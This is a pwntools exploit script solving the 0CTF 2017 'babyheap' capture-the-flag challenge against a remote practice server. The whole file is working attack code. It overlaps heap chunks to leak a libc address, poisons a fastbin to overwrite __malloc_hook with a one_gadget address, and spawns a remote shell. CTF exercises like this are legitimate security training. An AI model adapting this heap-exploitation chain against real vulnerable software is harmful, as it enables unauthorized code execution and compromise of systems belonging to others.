from pwn import *
from LibcSearcher import *
# context.log_level = "debug"
# sh = process("./babyheap_0ctf_2017")
sh = remote("node3.buuoj.cn",27881)
elf = ELF("./babyheap_0ctf_2017")
libc = ELF("/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so")

def allocated(size):
    sh.sendlineafter("Command: ",'1')
    sh.sendlineafter("Size: ",str(size))

def fill(index, content):
    sh.sendlineafter("Command: ",'2')
    sh.sendlineafter("Index: ",str(index))
    sh.sendlineafter("Size: ",str(len(content)))
    sh.sendlineafter("Content: ",content)

def free(index):
    sh.sendlineafter("Command: ",'3')
    sh.sendlineafter("Index: ",str(index))

def dump(index):
    sh.sendlineafter("Command: ",'4')
    sh.sendlineafter("Index: ",str(index))

def exit():
    sh.sendlineafter("Command: ",'5')

allocated(0x10) #chunk0 
allocated(0x10) #chunk1 
allocated(0x80) #chunk2
allocated(0x10) #chunk3
allocated(0x60) #chunk4
content_0 = p64(0) * 3 + p64(0x51)
content_2 = p64(0) * 5 + p64(0x91)
fill(0,content_0)
fill(2,content_2)
free(1)
allocated(0x40)
content_1 = p64(0) * 3 + p64(0x91)
fill(1,content_1)
free(2)
dump(1)
sh.recvuntil("Content: \n")
leak = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
offset = 0x3c4b78
log.success("0x%x"%leak)
libc_base = leak - offset
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x4526a
free(4)
fake_chunk = malloc_hook - 0x23
content_3 = p64(0) * 3 + p64(0x71) + p64(fake_chunk)
fill(3,content_3)
allocated(0x60)
allocated(0x60)
fill(4,p8(0)*3+p64(0)*2+ p64(one_gadget))
allocated(225)
sh.interactive()
